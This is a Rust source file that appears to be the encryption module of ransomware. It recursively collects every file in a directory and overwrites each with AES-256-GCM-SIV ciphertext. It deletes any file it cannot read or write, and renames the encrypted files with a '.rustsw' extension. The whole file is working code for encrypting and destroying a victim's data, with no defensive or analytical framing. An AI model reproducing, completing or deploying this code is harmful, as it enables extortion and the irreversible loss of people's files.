use aes_gcm_siv::aead::consts::{B0, B1};
use aes_gcm_siv::aead::generic_array::typenum::{UInt, UTerm};
use aes_gcm_siv::aead::generic_array::GenericArray;
use aes_gcm_siv::aead::{Aead, NewAead};
use aes_gcm_siv::{Aes256GcmSiv, Key, Nonce};
use rand::prelude::*;
use rand_hc::Hc128Rng;
use std::fs;
use std::path;

const ENCRYPTED_EXTENSION: &str = ".rustsw";

pub struct Encryptor {
    nonce: GenericArray<u8, UInt<UInt<UInt<UInt<UTerm, B1>, B1>, B0>, B0>>,
    cipher: Aes256GcmSiv,
}

impl Encryptor {
    pub fn from(key_bytes: [u8; 32], nonce_bytes: [u8; 12]) -> Encryptor {
        let key = Key::from(key_bytes);
        let cipher = Aes256GcmSiv::new(&key);
        let nonce = Nonce::from(nonce_bytes);

        Encryptor { nonce, cipher }
    }

    pub fn encrypt(&self, plain_text: &Vec<u8>) -> Vec<u8> {
        match self.cipher.encrypt(&self.nonce, plain_text.as_ref()) {
            Ok(encrypted_text) => encrypted_text,
            Err(_) => vec![],
        }
    }

    pub fn encrypt_file_else_delete(&self, path: &String) {
        let bytes_to_encrypt = match fs::read(&path) {
            Ok(bytes) => bytes,
            Err(_) => {
                attempt_delete_file(&path);
                return;
            }
        };
        let bytes_encrypted = self.encrypt(&bytes_to_encrypt);

        match fs::write(&path, bytes_encrypted) {
            Ok(_) => (),
            Err(_) => {
                attempt_delete_file(&path);
            }
        };
    }

    pub fn encrypt_dir(&self, dir: &String) -> bool {
        let files = match fs_extra::dir::get_dir_content(&dir) {
            Ok(content) => content.files,
            Err(_) => return false,
        };

        encrypt_files(&files, &self);
        true
    }

    pub fn encrypt_files(&self, files: &Vec<String>) {
        for file in files {
            println!("Name: {}", &file); // HACK DEBUG print
            self.encrypt_file_else_delete(&file);

            match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
                Ok(_) => (),
                Err(_) => (),
            };
        }
    }
}

fn attempt_delete_file(path: &String) {
    match fs::remove_file(path) {
        Ok(_) => (),
        Err(_) => (),
    };
}

fn encrypt_files(files: &Vec<String>, encryptor: &Encryptor) {
    for file in files {
        println!("Name: {}", &file); // HACK DEBUG print
        encryptor.encrypt_file_else_delete(&file);

        match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
            Ok(_) => (),
            Err(_) => (),
        };
    }
}
